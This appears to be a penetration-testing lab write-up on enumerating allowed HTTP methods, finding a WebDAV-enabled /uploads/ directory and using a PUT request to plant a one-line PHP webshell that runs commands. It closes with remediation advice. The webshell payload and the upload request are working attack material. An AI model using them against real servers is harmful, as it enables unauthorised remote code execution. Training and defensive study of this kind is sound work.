---
title: "HTTP Method Enumeration"
description: "Enumerating the HTTP methods a web application allows — with curl (HEAD/OPTIONS/PUT), Wireshark and Burp Suite — discovering a WebDAV-enabled /uploads/ directory and abusing PUT to upload a webshell for remote code execution."
date: 2026-01-02
platform: "INE Labs"
difficulty: "Medium"
tags: ["Web", "HTTP Methods", "WebDAV", "curl", "Burp Suite", "Dirb", "Webshell", "PUT"]
cover: "./photo20.png"
---

# HTTP Method Enumeration

**Classification:** Host & Network Penetration Testing / Web & HTTP Protocol<br>
**Target:** demo.ine.local (192.118.51.3) — Apache

## 1. Executive Summary

Enumerating which HTTP methods a server allows can reveal dangerous capabilities. Using
`curl`, Wireshark and Burp Suite, we probe the methods per resource and find a
**WebDAV-enabled `/uploads/`** directory (`OPTIONS` returns `DAV: 1,2` with PUT/DELETE/MOVE).
We abuse **PUT** to upload a webshell and get remote code execution.

## 2. Recon

```bash
ping -c 4 demo.ine.local
```

![Ping target](./photo1.png)

![Web application (login)](./photo2.png)

Observing the TCP/HTTP handshake in Wireshark.

![Wireshark — interface (1)](./photo3.png)

![Capture (2)](./photo4.png)

![TCP handshake SYN/SYN-ACK/ACK](./photo5.png)

```bash
netstat -ant     # confirm the connection on reload
```

![netstat](./photo6.png)

## 3. Probing Methods with curl

```bash
curl http://192.118.51.3/
```

![curl — body](./photo7.png)

```bash
curl -I http://192.118.51.3/        # HEAD
```

![curl -I — HEAD](./photo8.png)

```bash
curl -X OPTIONS -i http://192.118.51.3/     # allowed methods
```

![curl -X OPTIONS (1)](./photo9.png)

![OPTIONS response (2)](./photo10.png)

```bash
curl -X PUT http://192.118.51.3/test.txt -d "data"
```

![curl -X PUT](./photo11.png)

## 4. Burp Suite

Routing through Burp and intercepting requests/logins.

![Burp proxy (1)](./photo12.png)

![Burp open (2)](./photo13.png)

![Intercepting the page (3)](./photo14.png)

![Intercepting a login (4)](./photo15.png)

![Login request (5)](./photo16.png)

![Sending to Repeater (6)](./photo17.png)

## 5. Finding WebDAV (/uploads/)

```bash
dirb http://192.118.51.3/        # /uploads
```

![Dirb — /uploads found](./photo18.png)

![Intercepting /uploads/ in Burp](./photo19.png)

Changing `GET` to `OPTIONS` on `/uploads/` in Repeater shows WebDAV is enabled.

```http
OPTIONS /uploads/ HTTP/1.1
->
DAV: 1,2
Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK
```

![OPTIONS /uploads/ — DAV 1,2](./photo20.png)

## 6. Exploiting PUT → Webshell

```http
PUT /uploads/shell.php HTTP/1.1
Host: 192.118.51.3

<?php system($_GET['cmd']); ?>
```

![Uploading the webshell via PUT (1)](./photo21.png)

![Webshell uploaded (2)](./photo22.png)

```
http://192.118.51.3/uploads/shell.php?cmd=id
```

![Webshell command execution](./photo23.png)

## 7. Remediation Recommendations

1. **Disable WebDAV / dangerous methods** (PUT, DELETE, MOVE, TRACE) unless required; make
   upload directories non-executable.
2. **Restrict allowed methods** per resource (e.g. `LimitExcept`) and require auth for writes.
3. **Validate uploads** server-side and store them outside the web root.
4. **Monitor** for `PUT` of executable extensions and anomalous method usage.
